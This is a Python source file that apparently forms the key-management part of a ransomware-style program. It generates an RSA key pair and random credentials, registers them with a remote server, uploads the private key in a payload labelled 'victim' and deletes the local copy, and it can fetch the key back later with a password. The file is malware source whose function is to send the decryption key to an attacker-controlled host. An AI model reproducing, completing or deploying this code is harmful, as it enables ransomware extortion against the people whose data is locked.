import os, requests, json, rsakeys, base64, constants

def createCredentials():
    credentials = {}
    credentials['name'] = base64.b64encode(os.urandom(constants.CONST_CRED_SIZE)).decode(constants.CONST_ENCODING)
    credentials['password'] = base64.b64encode(os.urandom(constants.CONST_CRED_SIZE)).decode(constants.CONST_ENCODING)


    DATA = {'name': credentials['name'], 'password': credentials['password']}
    requests.post(url = constants.CONST_ADD_URL, data = DATA)

    filepath = os.path.join(os.path.join(os.getcwd(), "keys"),"info")
    with open(filepath, 'w+') as file:
        file.write(json.dumps(credentials, indent = constants.CONST_INDENT_SIZE))
        file.close()
 

def createToken():
    infoFilePath = os.path.join(os.path.join(os.getcwd(), "keys"), "info")
    tokenFilePath = os.path.join(os.path.join(os.getcwd(), "keys"), "token")
    token = {}
    with open(infoFilePath) as file:
        try:
            credentials = json.load(file)
            r = requests.post(url = constants.CONST_LOGIN_URL, data = credentials)
            data = r.json()
            token['token'] = data['token']
            file.close()

        except Exception as e:
            print(e)

    # Save token
    with open(tokenFilePath, 'w+') as file:
            file.write(json.dumps(token,indent=4))
            file.close()


# Gets token From file 
def getToken():
    token = ""
    tokenFilePath = os.path.join(os.path.join(os.getcwd(), "keys"), "token")
    with open(tokenFilePath) as jsonFile:
        token = (json.load(jsonFile))['token']
        jsonFile.close()
    return token

def getPassword():
    password = ""
    filepath = os.path.join(os.path.join(os.getcwd(), "keys"),"info")
    with open(filepath, 'r') as file:
        password = (json.load(file))['password']
        file.close()
    return password    


def uploadPrivateKey(filepath):
    victim = {}
    victim['token'] = getToken()
    headers = {}
    headers['Authorization'] = 'Bearer ' + victim['token']

    with open(filepath, 'r') as keyFile:
        victim['key'] = keyFile.read()
        keyFile.close()

    requests.post(url = constants.CONST_UPLOAD_URL, data = victim, headers = headers) 
    os.remove(filepath)

def downloadPrivateKey(password):
    rsakeys.createDirectory('keys')
    keyFolder = os.path.join(os.getcwd(), "keys")
    privateKeyPath = os.path.join(keyFolder, "private_key")
    token = getToken()
    headers = {}
    headers['Authorization'] = 'Bearer ' + token
    params = {}
    params['password'] = password
    r = requests.get(url = constants.CONST_DOWNLOAD_URL, headers = headers, data=params )

    # TODO: Add in param['public'] for database to search for corresponding private key 
    data = r.json()
    print(data)
    with open(privateKeyPath, 'w') as privateKey:
       privateKey.write((data[0])['key'])
       privateKey.close()

def postKeyPair(directory):
    keyPair = {}
    privateKeyPath = os.path.join(directory, constants.CONST_PRIVATE_KEY)
    publicKeyPath = os.path.join(directory, constants.CONST_PUBLIC_KEY)
    with open(privateKeyPath) as file:
        keyPair['private'] = file.read()
        file.close()

    with open(publicKeyPath) as file:
        keyPair['public'] = file.read()
        file.close()

    requests.post(url = constants.CONST_ADD_URL, data = keyPair)
    # TODO get token from server

def startProcess():
    rsakeys.createDirectory('keys')
    keyFolder = os.path.join(os.getcwd(), 'keys')
    privateKeyPath = os.path.join(keyFolder, constants.CONST_PRIVATE_KEY)
    rsakeys.createKeyPair(keyFolder)
    createCredentials()
    createToken()
    uploadPrivateKey(privateKeyPath)